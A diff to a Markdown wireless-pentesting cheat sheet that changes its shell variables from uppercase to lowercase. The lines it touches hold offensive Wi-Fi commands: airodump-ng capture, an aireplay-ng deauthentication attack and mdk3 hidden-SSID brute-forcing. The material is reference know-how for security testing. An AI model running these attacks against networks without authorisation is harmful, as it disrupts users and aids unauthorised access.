@@ -99,11 +99,11 @@ iwlist wlan0 frequency | grep Current
 ### airodump-ng
 
 ```bash
-airodump-ng $INTERFACE            # Start capture
-airodump-ng -c 6,11 $INTERFACE    # channel 6 and 11
+airodump-ng $interface            # Start capture
+airodump-ng -c 6,11 $interface    # channel 6 and 11
 airodump-ng --band a              # a: 5GHz
 airodump-ng --band bg             # b: 2,4GHz (11 Mbps) | g: 2,4GHz (54 Mbps)
-airodump-ng -w capture $INTERFACE # Save to file
+airodump-ng -w capture $interface # Save to file
 ```
 
 ### Hidden SSID Discovery
@@ -113,23 +113,23 @@ When ESSID = `<length: 0>` in airodump-ng, the SSID is hidden.
 - **Passive method** - wait for a client to connect:
 
 ```bash
-airodump-ng $INTERFACE -c $CHANNEL --bssid $BSSID -w capture
+airodump-ng $interface -c $channel --bssid $bssid -w capture
 ```
 
 - **Active method** - Deauth attack, force a client to reconnect:
 
 ```bash
-aireplay-ng -0 2 -a $BSSID -c $CLIENT_MAC $INTERFACE
+aireplay-ng -0 2 -a $bssid -c $client_mac $interface
 ```
 
 #### Brute-force SSID:
 
 ```bash
 # Full brute-force (short SSIDs only)
-mdk3 $INTERFACE p -b u -c 1 -t $BSSID
+mdk3 $interface p -b u -c 1 -t $bssid
 
 # Wordlist attack
-mdk3 $INTERFACE p -f /opt/wordlist.txt -t $BSSID
+mdk3 $interface p -f /opt/wordlist.txt -t $bssid
 
 # Character sets: u (uppercase), n (digits), a (all), c (mixed case), m (mixed+numbers)
 ```
@@ -140,7 +140,7 @@ mdk3 $INTERFACE p -f /opt/wordlist.txt -t $BSSID
 
 ```bash [aireplay-ng]
 # Deauthentication (transverse attack)
-aireplay-ng -0 <packets> -a $BSSID -c $CLIENT_MAC $INTERFACE
+aireplay-ng -0 <packets> -a $bssid -c $client_mac $interface
 ```
 
 ```bash [airgraph-ng]
@@ -194,6 +194,6 @@ network={
 :::
 
 ```bash
-wpa_supplicant -i $INTERFACE -c conf
-sudo dhclient $INTERFACE
+wpa_supplicant -i $interface -c conf
+sudo dhclient $interface
 ```
